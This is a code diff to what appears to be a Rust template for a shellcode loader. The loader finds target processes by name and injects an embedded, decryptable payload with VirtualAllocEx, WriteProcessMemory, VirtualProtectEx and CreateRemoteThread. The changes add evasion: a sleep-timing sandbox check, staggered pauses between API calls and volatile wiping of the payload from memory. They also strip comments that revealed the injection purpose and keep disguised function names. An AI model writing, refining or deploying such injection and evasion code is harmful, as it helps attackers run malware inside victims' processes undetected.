@@ -6,12 +6,14 @@ use std::ffi::OsStr;
 use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
 use windows::Win32::System::Memory::VirtualAllocEx;
 use windows::Win32::System::Memory::VirtualProtectEx;
-use windows::Win32::System::Memory::{MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_READWRITE};
+use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
 use windows::Win32::System::Threading::CreateRemoteThread;
 use windows::Win32::System::Threading::OpenProcess;
 use windows::Win32::System::Threading::PROCESS_ALL_ACCESS;
-//use windows::Win32::System::SystemInformation::GetPhysicallyInstalledSystemMemory;
 use std::include_bytes;
+use std::time::{Duration, Instant};
+use std::thread;
+
 {{IMPORTS}}
 
 {{SANDBOX_IMPORTS}}
@@ -19,80 +21,95 @@ use std::include_bytes;
 {{DECRYPTION_FUNCTION}}
 
 fn boxboxbox(tar: &str) -> Vec<usize> {
-    // search for processes to inject into
     let mut dom: Vec<usize> = Vec::new();
     let s = System::new_all();
     for pro in s.processes_by_exact_name(OsStr::new(tar)) {
-        //println!("{} {}", pro.pid(), pro.name());
         dom.push(usize::try_from(pro.pid().as_u32()).unwrap());
     }
     dom
 }
 
-fn enhance(buf: Vec<u8>, tar: usize) {
-    // injecting in target processes :)
+fn pause(ms: u64) {
+    thread::sleep(Duration::from_millis(ms));
+}
 
+fn check_environment() -> bool {
+    let start = Instant::now();
+    pause(3000);
+    start.elapsed().as_millis() >= 2500
+}
+
+fn wipe(buf: &mut Vec<u8>) {
+    for b in buf.iter_mut() {
+        unsafe { std::ptr::write_volatile(b as *mut u8, 0); }
+    }
+    buf.clear();
+}
+
+fn enhance(mut buf: Vec<u8>, tar: usize) {
     unsafe {
-        let h_process = OpenProcess(PROCESS_ALL_ACCESS, false, tar as u32).unwrap();
-        let result_ptr = VirtualAllocEx(h_process, None, buf.len(), MEM_COMMIT, PAGE_READWRITE);
+        let h_process = match OpenProcess(PROCESS_ALL_ACCESS, false, tar as u32) {
+            Ok(h) => h,
+            Err(_) => return,
+        };
+
+        pause(150);
+
+        let buf_len = buf.len();
+        let result_ptr = VirtualAllocEx(h_process, None, buf_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+        pause(200);
+
         let mut byteswritten = 0;
-        let _resb = WriteProcessMemory(
+        let _ = WriteProcessMemory(
             h_process,
             result_ptr,
             buf.as_ptr() as _,
-            buf.len(),
+            buf_len,
             Some(&mut byteswritten),
         );
+
+        wipe(&mut buf);
+        pause(150);
+
         let mut old_perms = PAGE_READWRITE;
-        let _bool = VirtualProtectEx(
+        let _ = VirtualProtectEx(
             h_process,
             result_ptr,
-            buf.len(),
+            buf_len,
             PAGE_EXECUTE_READ,
             &mut old_perms,
         );
-        let _res_crt = CreateRemoteThread(
+
+        pause(100);
+
+        let _ = CreateRemoteThread(
             h_process,
             None,
             0,
-            Some(std::mem::transmute::<*mut std::ffi::c_void, unsafe extern "system" fn(*mut std::ffi::c_void) -> u32>(result_ptr)),
+            Some(std::mem::transmute(result_ptr)),
             None,
             0,
             None,
-        )
-        .unwrap();
+        );
     }
 }
 
 fn main() {
     {{SANDBOX}}
-    
-    // inject in the following processes:
+
+    if !check_environment() { return; }
+
     let tar: &str = "{{TARGET_PROCESS}}";
 
-    // Removing the sandobox check for now, as it fails on numerous Windows versions.
-    /*
-    let mut memory = 0;
-    unsafe {
-        let is_quicksand = GetPhysicallyInstalledSystemMemory(&mut memory);
-        println!("{:#?}", is_quicksand);
-        if is_quicksand != 1 {
-            panic!("Hello.")
-        }
-    }
-    */
-
     let buf = include_bytes!({{PATH_TO_SHELLCODE}});
-    let mut vec: Vec<u8> = Vec::new();
-    for i in buf.iter() {
-        vec.push(*i);
-    }
+    let mut vec: Vec<u8> = buf.to_vec();
+
+    {{MAIN}}
+
     let list: Vec<usize> = boxboxbox(tar);
-    if list.is_empty() {
-        return;
-    } else {
+    if !list.is_empty() {
         for i in &list {
-            {{MAIN}}
             enhance(vec.clone(), *i);
         }
     }
